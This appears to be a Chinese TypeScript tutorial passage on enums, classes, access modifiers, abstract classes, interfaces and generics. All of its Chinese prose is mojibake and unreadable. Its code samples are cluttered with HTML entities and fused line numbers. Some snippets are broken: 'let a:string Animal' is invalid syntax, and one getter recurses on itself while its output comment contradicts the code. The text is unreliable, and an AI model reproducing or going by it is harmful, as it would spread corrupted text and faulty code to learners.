å‰é¢æˆ‘ä»¬æ‰€ä¸¾çš„ä¾‹å­éƒ½æ˜¯å¸¸æ•°é¡¹ï¼Œä¸€ä¸ªå…¸åž‹çš„è®¡ç®—æ‰€å¾—é¡¹çš„ä¾‹å­ï¼š 1enum Color &#123; Red, Green, Blue = 'blue'.length&#125; ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ&quot;blue&quot;.length å°±æ˜¯ä¸€ä¸ªè®¡ç®—æ‰€å¾—é¡¹ã€‚ ä¸Šé¢çš„ä¾‹å­ä¸ä¼šæŠ¥é”™ï¼Œä½†æ˜¯å¦‚æžœç´§æŽ¥ç€åœ¨è®¡ç®—æ‰€å¾—é¡¹åŽé¢æ˜¯æœªæ‰‹åŠ¨èµ‹å€¼çš„é¡¹ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šå› ä¸ºæ— æ³•å–å¾—åˆå§‹å€¼è€ŒæŠ¥é”™ï¼š 12enum Color &#123; Blue = 'blue'.length,Red, Green &#125;// error TS1061: Enum member must have initializer. ä¸‹é¢æ˜¯å¸¸æ•°é¡¹å’Œè®¡ç®—æ‰€å¾—é¡¹çš„å®Œæ•´å®šä¹‰ï¼Œéƒ¨åˆ†å¼•ç”¨è‡ªä¸­æ–‡æ‰‹å†Œ - æžšä¸¾ï¼š å½“æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶ï¼Œæžšä¸¾æˆå‘˜è¢«å½“ä½œæ˜¯å¸¸æ•°ï¼š ä¸å…·æœ‰åˆå§‹åŒ–å‡½æ•°å¹¶ä¸”ä¹‹å‰çš„æžšä¸¾æˆå‘˜æ˜¯å¸¸æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å‰æžšä¸¾æˆå‘˜çš„å€¼ä¸ºä¸Šä¸€ä¸ªæžšä¸¾æˆå‘˜çš„å€¼åŠ  1ã€‚ä½†ç¬¬ä¸€ä¸ªæžšä¸¾å…ƒç´ æ˜¯ä¸ªä¾‹å¤–ã€‚å¦‚æžœå®ƒæ²¡æœ‰åˆå§‹åŒ–æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒçš„åˆå§‹å€¼ä¸º 0ã€‚ æžšä¸¾æˆå‘˜ä½¿ç”¨å¸¸æ•°æžšä¸¾è¡¨ç¤ºå¼åˆå§‹åŒ–ã€‚å¸¸æ•°æžšä¸¾è¡¨è¾¾å¼æ˜¯ TypeScript è¡¨è¾¾å¼çš„å­é›†ï¼Œå®ƒå¯ä»¥åœ¨ç¼–è¯‘é˜¶æ®µæ±‚å€¼ã€‚å½“ä¸€ä¸ªè¡¨ç¤ºå¼æ»¡è¶³ä¸‹é¢çš„ä¹‹ä¸€æ—¶ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå¸¸æ•°æžšä¸¾è¡¨è¾¾å¼ï¼š æ•°å­—å­—é¢é‡ åº”ç”¨ä¹‹å‰å®šä¹‰çš„å¸¸æ•°æžšä¸¾æˆå‘˜ï¼ˆå¯ä»¥åœ¨ä¸åŒçš„æžšä¸¾ç±»åž‹ä¸­å®šä¹‰çš„ï¼‰å¦‚æžœè¿™ä¸ªæˆå‘˜æ˜¯åœ¨åŒä¸€æžšä¸¾ç±»åž‹ä¸­å®šä¹‰çš„ï¼Œå¯ä»¥ä½¿ç”¨éžé™å®šåæ¥å¼•ç”¨ å¸¦æ‹¬å·çš„å¸¸æ•°æžšä¸¾è¡¨è¾¾å¼ +, -, ~ ä¸€å…ƒè¿ç®—ç¬¦åº”ç”¨äºŽå¸¸æ•°æžšä¸¾è¡¨è¾¾å¼ +, -, *, /, %, &lt;&lt;, &gt;&gt;, &gt;&gt;&gt;, &amp;, |, ^ äºŒå…ƒè¿ç®—ç¬¦ï¼Œå¸¸æ•°æžšä¸¾è¡¨è¾¾å¼åšä¸ºå…¶ä¸€ä¸ªæ“ä½œå¯¹è±¡ã€‚è‹¥å¸¸æ•°æžšä¸¾è¡¨è¾¾å¼æ±‚å€¼åŽä¸ºNaNæˆ–Infinityï¼Œåˆ™ä¼šåœ¨ç¼–è¯‘é˜¶æ®µæŠ¥é”™ æ‰€æœ‰å…¶å®ƒæƒ…å†µçš„æžšä¸¾æˆå‘˜è¢«å½“ä½œæ˜¯éœ€è¦è®¡ç®—å¾—å‡ºçš„å€¼ã€‚ å¸¸æ•°æžšä¸¾å¸¸æ•°æžšä¸¾æ˜¯ä½¿ç”¨ const enumå®šä¹‰çš„æžšä¸¾ç±»åž‹ï¼š 123456const enum Directions &#123; Up, Down, Left, Right&#125; å¸¸æ•°æžšä¸¾ä¸Žæ™®é€šæžšä¸¾çš„åŒºåˆ«æ˜¯ï¼Œå®ƒä¼šåœ¨ç¼–è¯‘é˜¶æ®µè¢«åˆ é™¤ï¼Œå¹¶ä¸”ä¸èƒ½åˆ é™¤è®¡ç®—æˆå‘˜ ä¸Šé¢ç¼–è¯‘çš„ç»“æžœæ˜¯ï¼š 1var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */]; å‡å¦‚åŒ…å«äº†è®¡ç®—æˆå‘˜ï¼Œåˆ™ä¼šåœ¨ç¼–è¯‘é˜¶æ®µæŠ¥é”™ï¼š 12const enum Color &#123; Red, Green, Blue = 'blue'.length &#125;;// error TS2474: In 'const' enum declarations member initializer must be constant expression. å¤–éƒ¨æžšä¸¾å¤–éƒ¨æžšä¸¾ï¼ˆAmbient Enumsï¼‰æ˜¯ä½¿ç”¨ declare enumå®šä¹‰çš„æžšä¸¾ç±»åž‹ï¼š 1234567declare enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; declareå®šä¹‰çš„ç±»åž‹åªä¼šç”¨äºŽç¼–è¯‘æ—¶çš„æ£€æŸ¥ï¼Œç¼–è¯‘ç»“æžœä¸­ä¼šè¢«åˆ é™¤ 1var directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; å¤–éƒ¨æžšä¸¾ä¸Žå£°æ˜Žè¯­å¥ä¸€æ ·ï¼Œå¸¸å‡ºçŽ°åœ¨å£°æ˜Žæ–‡ä»¶ä¸­ã€‚ åŒæ—¶ä½¿ç”¨ declareå’Œ constä¹Ÿæ˜¯å¯ä»¥çš„ï¼š 1234567declare const enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; ç¼–è¯‘ç»“æžœï¼š 1var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */]; TypeScript çš„æžšä¸¾ç±»åž‹çš„æ¦‚å¿µæ¥æºäºŽ C#ã€‚ ç±»ä¼ ç»Ÿçš„æ–¹æ³•ä¸­ï¼ŒJavaScript é€šè¿‡æž„é€ å‡½æ•°å®žçŽ°ç±»çš„æ¦‚å¿µï¼Œé€šè¿‡åŽŸåž‹é“¾å®žçŽ°ç»§æ‰¿ã€‚ ypeScript é™¤äº†å®žçŽ°äº†æ‰€æœ‰ ES6 ä¸­çš„ç±»çš„åŠŸèƒ½ä»¥å¤–ï¼Œè¿˜æ·»åŠ äº†ä¸€äº›æ–°çš„ç”¨æ³•ã€‚ è¿™ä¸€èŠ‚ä¸»è¦ä»‹ç»ç±»çš„ç”¨æ³•ï¼Œä¸‹ä¸€èŠ‚å†ä»‹ç»å¦‚ä½•å®šä¹‰ç±»çš„ç±»åž‹ã€‚ ç±»çš„æ¦‚å¿µ ç±»ï¼ˆClassï¼‰:å®šä¹‰ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ï¼ŒåŒ…å«å®ƒçš„å±žæ€§å’Œæ–¹æ³• å¯¹è±¡ï¼ˆObjectï¼‰:ç±»çš„å®žä¾‹ï¼Œé€šè¿‡ newç”Ÿæˆ é¢å‘å¯¹è±¡ï¼ˆOOPï¼‰çš„ä¸‰å¤§ç‰¹æ€§ï¼šå°è£…ã€ç»§æ‰¿ã€å¤šæ€ å°è£…ï¼ˆEncapsulationï¼‰:å°†å¯¹æ•°æ®çš„æ“ä½œç»†èŠ‚éšè—èµ·æ¥ï¼Œåªæš´éœ²å¯¹å¤–çš„æŽ¥å£ã€‚å¤–ç•Œè°ƒç”¨ç«¯ä¸éœ€è¦çŸ¥é“ç»†èŠ‚ï¼Œå°±èƒ½é€šè¿‡å¯¹å¤–æä¾›çš„æŽ¥å£æ¥è®¿é—®è¯¥å¯¹è±¡ï¼ŒåŒæ—¶ä¹Ÿä¿è¯äº†å¤–ç•Œæ— æ³•ä»»æ„æ›´æ”¹å¯¹è±¡å†…éƒ¨çš„æ•°æ®ã€‚ ç»§æ‰¿ï¼ˆInheritanceï¼‰:å­ç±»ç»§æ‰¿çˆ¶ç±»ï¼Œå­ç±»é™¤äº†æ‹¥æœ‰çˆ¶ç±»çš„æ‰€æœ‰ç‰¹å¾å¤–ï¼Œè¿˜æœ‰ä¸€äº›æ›´å…·ä½“çš„ç‰¹æ€§ å¤šæ€ï¼ˆPolymorphismï¼‰:ç”±ç»§æ‰¿è€Œäº§ç”Ÿäº†ç›¸å…³çš„ä¸åŒçš„ç±»ï¼Œå¯¹åŒä¸€ä¸ªæ–¹æ³•å¯ä»¥æœ‰ä¸åŒçš„å“åº”ã€‚æ¯”å¦‚ catå’Œ Dogéƒ½ç»§æ‰¿è‡ª Animalï¼Œä½†æ˜¯åˆ†åˆ«å®žçŽ°äº†è‡ªå·±çš„ eat æ–¹æ³•ã€‚æ­¤æ—¶é’ˆå¯¹æŸä¸€ä¸ªå®žä¾‹ï¼Œæˆ‘ä»¬æ— éœ€äº†è§£å®ƒæ˜¯ Cat è¿˜æ˜¯ Dogï¼Œå°±å¯ä»¥ç›´æŽ¥è°ƒç”¨ eat æ–¹æ³•ï¼Œç¨‹åºä¼šè‡ªåŠ¨åˆ¤æ–­å‡ºæ¥åº”è¯¥å¦‚ä½•æ‰§è¡Œ eat å­˜å–å™¨ï¼ˆgetter&amp;setterï¼‰:ç”¨ä»¥æ”¹å˜å±žæ€§çš„è¯»å–å’Œèµ‹å€¼è¡Œä¸º ä¿®é¥°ç¬¦ï¼ˆModifiersï¼‰:ä¿®é¥°ç¬¦æ˜¯ä¸€äº›å…³é”®å­—ï¼Œç”¨äºŽé™å®šæˆå‘˜æˆ–ç±»åž‹çš„æ€§è´¨ã€‚æ¯”å¦‚ publicè¡¨ç¤ºå…¬å…±å±žæ€§æˆ–æ–¹æ³• æŠ½è±¡ç±»ï¼ˆAbstracesï¼‰:æŠ½è±¡ç±»æ˜¯ä¾›å…¶ä»–ç±»ç»§æ‰¿çš„åŸºç±»ï¼ŒæŠ½è±¡ç±»ä¸å…è®¸è¢«å®žä¾‹åŒ–ã€‚æŠ½è±¡ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•å¿…é¡»åœ¨å­ç±»ä¸­è¢«å®žçŽ° æŽ¥å£ï¼ˆInterfacesï¼‰:ä¸åŒç±»ä¹‹é—´å…±æœ‰çš„å±žæ€§æˆ–æ–¹æ³•ï¼Œå¯ä»¥æŠ½è±¡æˆä¸€ä¸ªæŽ¥å£ã€‚æŽ¥å£å¯ä»¥è¢«å®žçŽ°ï¼ˆimplementsï¼‰ã€‚ä¸€ä¸ªç±»åªèƒ½ç»§æ‰¿è‡ªå¦ä¸€ä¸ªç±»ï¼Œä½†æ˜¯å¯ä»¥å®žçŽ°å¤šä¸ªæŽ¥å£ã€‚ ES6ä¸­ç±»çš„ç”¨æ³•ä¸‹é¢æˆ‘ä»¬å…ˆå›žé¡¾ä¸€ä¸‹ ES6 ä¸­ç±»çš„ç”¨æ³•ï¼Œæ›´è¯¦ç»†çš„ä»‹ç»å¯ä»¥å‚è€ƒ ECMAScript 6 å…¥é—¨ - Classã€‚ å±žæ€§å’Œæ–¹æ³•ä½¿ç”¨ classå®šä¹‰ç±»ï¼Œä½¿ç”¨ constructorå®šä¹‰æž„é€ å‡½æ•°ã€‚ é€šè¿‡ newç”Ÿæˆæ–°çš„å®žä¾‹çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨æž„é€ å‡½æ•°ã€‚ 1234567891011class Animal &#123; constructor(name) &#123; this.name = name; &#125; sayHi() &#123; return `My name is $&#123;this.name&#125;`; &#125;&#125;let a = new Animal('Jack');console.log(a.sayHi()); // My name is Jack ç±»çš„ç»§æ‰¿ä½¿ç”¨ extendså…³é”®å­—å®žçŽ°ç»§æ‰¿ï¼Œå­ç±»ä¸­ä½¿ç”¨ superå…³é”®å­—æ¥è°ƒç”¨çˆ¶ç±»çš„æž„é€ å‡½æ•°å’Œæ–¹æ³• 123456789101112class Cat extends Animal &#123; constructor(name)&#123; super(name); // è°ƒç”¨çˆ¶ç±»çš„ constructor(name) console.log(this.name); &#125; sayHi()&#123; return `Meow,`+super.sayHi(); // è°ƒç”¨çˆ¶ç±»çš„ sayHi() &#125;&#125;let c = new Cat('Tom');console.log(c.sayHi()); // Meow,My name is Tom å­˜å‚¨å™¨ä½¿ç”¨ getter å’Œ setter å¯ä»¥æ”¹å˜å±žæ€§çš„èµ‹å€¼å’Œè¯»å–è¡Œä¸ºï¼š 1234567891011121314151617class Animal &#123; constructor(name)&#123; this.name = name; &#125; sayHi()&#123; return `My name is $&#123;this.name&#125;` &#125; get name()&#123; return this.name; &#125; set name(value)&#123; console.log('setter: '+ value); &#125;&#125;let a = new Animal('Kitty'); // setter: Kittya.name = 'Tom'; // setter: Tomconsole.log(a.name); // Jack é™æ€æ–¹æ³•ä½¿ç”¨ staticä¿®é¥°ç¬¦ä¿®é¥°çš„æ–¹æ³•è¢«ç§°ä¸ºé™æ€æ–¹æ³•ï¼Œä»–ä»¬ä¸éœ€è¦å®žä¾‹åŒ–ï¼Œè€Œæ˜¯ç›´æŽ¥é€šè¿‡ç±»æ¥è°ƒç”¨ï¼š 123456789class Animal &#123; static isAnimal(a) &#123; return a instanceof Animal; &#125;&#125;let a = new Animal('Jack');Animal.isAnimal(a); // truea.isAnimal(a); // TypeError: a.isAnimal is not a function ES7ä¸­ç±»çš„ç”¨æ³•ES7ä¸­æœ‰ä¸€äº›å…³äºŽç±»çš„ææ¡ˆï¼ŒTypeScript ä¹Ÿå®žçŽ°äº†å®ƒä»¬ã€‚ å®žä¾‹å±žæ€§ES6ä¸­å®žä¾‹çš„å±žæ€§åªèƒ½é€šè¿‡æž„é€ å‡½æ•°ä¸­çš„ this.xxæ¥å®šä¹‰ï¼ŒES7ææ¡ˆå¯ä»¥ç›´æŽ¥åœ¨ç±»é‡Œé¢å®šä¹‰ï¼š 12345678class Animal&#123; name = 'Jack'; constructor()&#123; // ... &#125;&#125;let a = new Animal();console.log(a.name); // Jack é™æ€å±žæ€§ES7ææ¡ˆä¸­ï¼Œå¯ä»¥ä½¿ç”¨ staticå®šä¹‰ä¸€ä¸ªé™æ€å±žæ€§ 1234567class Animal &#123; static num = 42; constructor()&#123; //... &#125;&#125;console.log(Animal.num); // 42 TypeScript ä¸­ ç±»çš„ç”¨æ³•public private å’Œ protectedTypeScripy å¯ä»¥ä½¿ç”¨ä¸‰ç§è®¿é—®ä¿®é¥°ç¬¦ï¼ˆAccess Modifiersï¼‰ï¼Œåˆ†åˆ«æ˜¯ publicã€privateå’Œ protectedã€‚ publicä¿®é¥°çš„å±žæ€§æˆ–æ–¹æ³•æ˜¯å…±æœ‰çš„ï¼Œå¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®åˆ°ï¼Œé»˜è®¤æ‰€æœ‰çš„å±žæ€§å’Œæ–¹æ³•éƒ½æ˜¯ public privateä¿®é¥°çš„å±žæ€§å’Œæ–¹æ³•éƒ½æ˜¯ç§æœ‰çš„ï¼Œä¸èƒ½åœ¨å£°æ˜Žå®ƒçš„ç±»çš„å¤–éƒ¨è®¿é—® protectedä¿®é¥°çš„å±žæ€§å’Œæ–¹æ³•æ˜¯å—ä¿æŠ¤çš„ï¼Œå®ƒå’Œ privateç±»ä¼¼ï¼ŒåŒºåˆ«æ˜¯å®ƒåœ¨å­åˆ—ä¸­ä¹Ÿæ˜¯å…è®¸è¢«è®¿é—®çš„ã€‚ ä¾‹å­ï¼š 1234567891011class Animal&#123; public name; public constructor(name)&#123; this.name = name; &#125;&#125;let a = new Animal('Jack');console.log(a.name); // Jacka.name = 'Tom';console.log(a.name); // Tom ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ nameè¢«è®¾ç½®ä¸º publicï¼Œæ‰€ä»¥ç›´æŽ¥è®¿é—®å®žä¾‹çš„ nameå±žæ€§æ˜¯è¢«å…è®¸çš„ã€‚å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›çš„å±žæ€§æ˜¯æ— æ³•ç›´æŽ¥å­˜å–çš„ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ç”¨ privateäº†ï¼š 123456789101112class Animal &#123; private name; public constructor(name)&#123; this.name = name; &#125;&#125;let a = new Animal('Jack');console.log(a.name); // Jacka.name = 'Tom';// index.ts(9,13): error TS2341: Property 'name' is private and only accessible within class 'Animal'.// index.ts(10,1): error TS2341: Property 'name' is private and only accessible within class 'Animal'. éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒTypeScirpt ç¼–è¯‘ä¹‹åŽçš„ä»£ç ä¸­ï¼Œå¹¶æ²¡æœ‰é™åˆ¶ privateå±žæ€§åœ¨å¤–éƒ¨çš„å¯è®¿é—®æ€§ï¼› ä¸Šé¢ä»£ç çš„ç¼–è¯‘ç»“æžœæ˜¯ï¼š 123456789var Animal = (function () &#123; function Animal(name) &#123; this.name = name; &#125; return Animal;&#125;());var a = new Animal('Jack');console.log(a.name);a.name = 'Tom'; ä½¿ç”¨ privateä¿®é¥°çš„å±žæ€§æˆ–æ–¹æ³•ï¼Œåœ¨å­ç±»ä¸­ä¸å…è®¸è®¿é—®çš„ï¼š 12345678910111213class Animal &#123; private name; public constructor(name)&#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name)&#123; super(name); console.log(this.name); &#125;&#125;// error TS2341: Property 'name' is private and only accessible within class 'Animal'. è€Œå¦‚æžœæ˜¯ç”¨ protectedä¿®é¥°ï¼Œåˆ™è¿è¡Œåœ¨å­ç±»ä¸­è®¿é—®ï¼š 12345678910111213class Animal &#123; protected name; public constructor(name)&#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name)&#123; super(name); console.log(this.name); &#125;&#125; æŠ½è±¡ç±»abstractç”¨äºŽå®šä¹‰æŠ½è±¡ç±»å’Œå…¶ä¸­çš„æŠ½è±¡æ–¹æ³•ã€‚ ä»€ä¹ˆæ˜¯æŠ½è±¡ç±»ï¼Ÿ é¦–å…ˆï¼ŒæŠ½è±¡ç±»æ˜¯ä¸å…è®¸è¢«å®žä¾‹åŒ–çš„: 12345678910abstract class Animal &#123; public name; public constructor(name)&#123; this.name = name; &#125; public abstract sayHi();&#125;let a = new Animal('jack');// error TS2511: Cannot create an instance of an abstract class. ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡ç±» Animalï¼Œå¹¶ä¸”å®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡çš„æ–¹æ³• sayHiã€‚åœ¨å®žä¾‹åŒ–ç±»çš„æ—¶å€™æŠ¥é”™äº†ã€‚ å…¶æ¬¡ï¼ŒæŠ½è±¡ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•å¿…é¡»è¢«å­ç±»å®žçŽ°ï¼š 12345678910111213141516abstract class Animal &#123; public name; public constructor(name)&#123; this.name = name; &#125; public abstract sayHi();&#125;class Cat extends Animal &#123; public eat()&#123; console.log(`$&#123;this.name&#125; is eating`); &#125;&#125;let cat = new Cat('Tom');// error TS2515: Non-abstract class 'Cat' does not implement inherited abstract member 'sayHi' from class 'Animal'. ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç±» catç»§æ‰¿äº†æŠ½è±¡ç±» Animalï¼Œä½†æ˜¯æ²¡æœ‰å®žçŽ°æŠ½è±¡æ–¹æ³• sayHiï¼Œæ‰€ä»¥ç¼–è¯‘æŠ¥é”™äº†ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªæ­£ç¡®ä½¿ç”¨æŠ½è±¡ç±»çš„ä¾‹å­ï¼š 123456789101112131415161718abstract class Animal &#123; public name; public constructor(name)&#123; this.name = name; &#125; public abstract sayHi();&#125;class Cat extends Animal &#123; public sayHi()&#123; console.log(`My name is $&#123;this.name&#125;`); &#125; public eat()&#123; console.log(`$&#123;this.name&#125; is eating`); &#125;&#125;let cat = new Cat('Tom'); ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®žçŽ°äº†æŠ½è±¡æ–¹æ³• sayHiï¼Œç¼–è¯‘é€šè¿‡äº†ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå³ä¾¿æ˜¯æŠ½è±¡æ–¹æ³•ï¼ŒTypeScript çš„ç¼–è¯‘ç»“æžœä¸­ï¼Œä»ç„¶ä¼šæœ‰è¿™ä¸ªç±»ï¼Œä¸Šé¢çš„ä»£ç çš„ç¼–è¯‘ç»“æžœæ˜¯ï¼š 123456789101112131415161718192021222324252627282930313233var __extends = (this &amp;&amp; this.__extends) || (function () &#123; var extendStatics = function (d, b) &#123; extendStatics = Object.setPrototypeOf || (&#123; __proto__: [] &#125; instanceof Array &amp;&amp; function (d, b) &#123; d.__proto__ = b; &#125;) || function (d, b) &#123; for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; &#125;; return extendStatics(d, b); &#125; return function (d, b) &#123; extendStatics(d, b); function __() &#123; this.constructor = d; &#125; d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __()); &#125;;&#125;)();var Animal = /** @class */ (function () &#123; function Animal(name) &#123; this.name = name; &#125; return Animal;&#125;());var Cat = /** @class */ (function (_super) &#123; __extends(Cat, _super); function Cat() &#123; return _super !== null &amp;&amp; _super.apply(this, arguments) || this; &#125; Cat.prototype.sayHi = function () &#123; console.log("My name is " + this.name); &#125;; Cat.prototype.eat = function () &#123; console.log(this.name + " is eating"); &#125;; return Cat;&#125;(Animal));var cat = new Cat('Tom'); ç±»çš„ç±»åž‹ç»™ ç±»åŠ ä¸Š TypeScript çš„ç±»åž‹å¾ˆç®€å•ï¼Œä¸ŽæŽ¥å£ç›¸ä¼¼ï¼š 1234567891011class Animal &#123; name: string; constructor(name: string)&#123; this.name = name; &#125; sayHi():string&#123; return `My name is $&#123;this.name&#125;` &#125;&#125;let a:string Animal = new Animal('Jack');console.log(a.sayHi()); // My name is Jack ç±»ä¸ŽæŽ¥å£æŽ¥å£ï¼ˆInterfacesï¼‰å¯ä»¥ç”¨äºŽå¯¹ã€Œå¯¹è±¡çš„å½¢çŠ¶ï¼ˆShapeï¼‰ã€è¿›è¡Œæè¿°ã€‚ è¿™ä¸€ç« ä¸»è¦ä»‹ç»æŽ¥å£çš„å¦ä¸€ä¸ªç”¨é€”ï¼Œå¯¹ç±»ä¸€éƒ¨åˆ†è¡Œä¸ºè¿›è¡ŒæŠ½è±¡ã€‚ ç±»å®žçŽ°æŽ¥å£å®žçŽ°ï¼ˆimplementsï¼‰æ˜¯é¢å‘å¯¹è±¡ä¸­çš„ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µã€‚ä¸€èˆ¬æ¥è®²ï¼Œä¸€ä¸ªç±»ç»§æ‰¿è‡ªå¦ä¸€ä¸ªç±»ï¼Œæœ‰æ—¶å€™ä¸åŒç±»ä¹‹é—´å¯ä»¥æœ‰ä¸€äº›å…±æœ‰çš„ç‰¹æ€§ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æŠŠç‰¹æ€§æå–æˆæŽ¥å£ï¼ˆinterfacesï¼‰ï¼Œç”¨ implementså…³é”®å­—æ¥å®žçŽ°ï¼Œè¿™ä¸ªç‰¹æ€§å¤§å¤§æé«˜äº†é¢å‘å¯¹è±¡çš„çµæ´»æ€§ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œé—¨æ˜¯ä¸€ä¸ªç±»ï¼Œé˜²ç›—é—¨æ˜¯é—¨çš„å­ç±»ã€‚å¦‚æžœé˜²ç›—é—¨æœ‰ä¸ªæŠ¥è­¦å™¨çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„ç»™é˜²ç›—é—¨åŠ ä¸€ä¸ªæŠ¥è­¦æ–¹æ³•ã€‚è¿™æ—¶å€™å¦‚æžœæœ‰å¦å¤–ä¸€ä¸ªç±»ï¼Œè½¦ï¼Œä¹Ÿæœ‰æŠ¥è­¦çš„åŠŸèƒ½ï¼Œå°±å¯ä»¥è€ƒè™‘æŠŠæŠ¥è­¦å™¨æå–å‡ºæ¥ï¼Œä½œä¸ºä¸€ä¸ªæŽ¥å£ï¼Œé˜²ç›—é—¨å’Œè½¦éƒ½åŽ»å®žçŽ°å®ƒ: 123456789101112131415interface Alarm &#123; alert();&#125;class Door&#123;&#125;class SecurityDoor extends Door implements Alarm &#123; alert()&#123; console.log('SecurityDoor alert'); &#125;&#125;class Car implements Alarm &#123; alert()&#123; console.log('car alert'); &#125;&#125; ä¸€ä¸ªç±»å¯ä»¥å®žçŽ°å¤šä¸ªæŽ¥å£ï¼š 12345678910111213141516171819202122232425interface Alarm &#123; alert();&#125;interface Light &#123; lightOn(); lightOff();&#125;class Door&#123;&#125;class SecurityDoor extends Door implements Alarm &#123; alert()&#123; console.log('SecurityDoor alert'); &#125;&#125;class Car implements Alarm,Light &#123; alert()&#123; console.log('car alert'); &#125; lightOff()&#123; console.log('Car light off'); &#125; lightOn()&#123; console.log('Car lightOn'); &#125;&#125; ä¸Šä¾‹ä¸­ï¼ŒCarå®žçŽ°äº† Alarmå’Œ LightæŽ¥å£ï¼Œå³èƒ½æŠ¥è­¦ï¼Œä¹Ÿèƒ½å¼€å…³è½¦ç¯ã€‚ æŽ¥å£ç»§æ‰¿æŽ¥å£æŽ¥å£ä¸ŽæŽ¥å£ä¹‹é—´ä¹Ÿæ˜¯å¯ä»¥ç»§æ‰¿çš„ï¼š 1234567interface Alarm &#123; alert();&#125;interface LightableAlarm extends Alarm &#123; lightOn(); lightOff();&#125; ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ extendsä½¿ LightableAlarmç»§æ‰¿ Alarm æŽ¥å£ç»§æ‰¿ç±»æŽ¥å£ä¹Ÿå¯ä»¥ç»§æ‰¿ç±»ï¼š 123456789class Point &#123; x: number; y: number;&#125;interface Point3d extends Point &#123; z: number;&#125;let point3d: Point3d = &#123;x:1, y:2, z:3&#125; æ··åˆç±»åž‹å¯ä»¥ä½¿ç”¨æŽ¥å£çš„æ–¹å¼æ¥é¡¶ä¸€ä¸ªå‡½æ•°éœ€è¦ç¬¦åˆçš„å½¢çŠ¶ï¼š 1234567interface SearchFunc &#123; (source: string, subString: string) : boolean;&#125;let mySearchFunc:SearchFunc;mySearchFunc = function(source: string, subString: string) : boolean&#123; return source.search(subString) !== -1;&#125; æœ‰æ—¶å€™ï¼Œä¸€ä¸ªå‡½æ•°è¿˜å¯ä»¥æœ‰è‡ªå·±çš„å±žæ€§å’Œæ–¹æ³•ï¼š 1234567891011121314151617interface Couter &#123; (start: number): string; interval :number; reset(): void;&#125;function getCounter() :Couter &#123; let counter = &lt;Couter&gt;function (start: number)&#123;&#125; counter.interval = 123; counter.reset = function()&#123;&#125; return counter;&#125;let c = getCounter();c(10);c.reset();c.interval = 0.5; æ³›åž‹æ³›åž‹ï¼ˆGenericsï¼‰æ˜¯æŒ‡åœ¨å®šä¹‰å‡½æ•°ã€æŽ¥å£æˆ–ç±»çš„æ—¶å€™ï¼Œä¸é¢„å…ˆæŒ‡å®šå…·ä½“çš„ç±»åž‹ï¼Œè€Œåœ¨ä½¿ç”¨çš„æ—¶å€™å†æŒ‡å®šç±»åž‹çš„ä¸€ç§ç‰¹æ€§ã€‚ ç®€å•çš„ä¾‹å­é¦–å…ˆï¼Œæˆ‘ä»¬å®žçŽ°ä¸€ä¸ªå‡½æ•° createArrayï¼Œå®ƒå¯ä»¥åˆ›å»ºä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„æ•°ç»„ï¼ŒåŒæ—¶å°†æ¯ä¸€é¡¹éƒ½å¡«å……ä¸€ä¸ªé»˜è®¤å€¼ï¼š 12345678function createArray(length: number, value: any):Array&lt;any&gt;&#123; let result = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3,'x'); ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¹‹å‰æåˆ°è¿‡çš„æ•°ç»„æ³›åž‹æ¥å®šä¹‰è¿”å›žå€¼çš„ç±»åž‹ã€‚ è¿™æ®µä»£ç çš„ç¼–è¯‘ä¸ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸€ä¸ªæ˜¾è€Œæ˜“è§çš„é”™è¯¯æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰å‡†ç¡®çš„å®šä¹‰è¿”å›žå€¼çš„ç±»åž‹ï¼š Array&lt;any&gt;è¿è¡Œæ•°ç»„çš„æ¯ä¸€é¡¹éƒ½ä¸ºä»»æ„ç±»åž‹ã€‚ä½†æ˜¯æˆ‘ä»¬é¢„æœŸçš„æ˜¯ï¼Œæ•°ç»„ä¸­æ¯ä¸€é¡¹éƒ½åº”è¯¥æ˜¯è¾“å…¥ valueçš„ç±»åž‹ï¼› 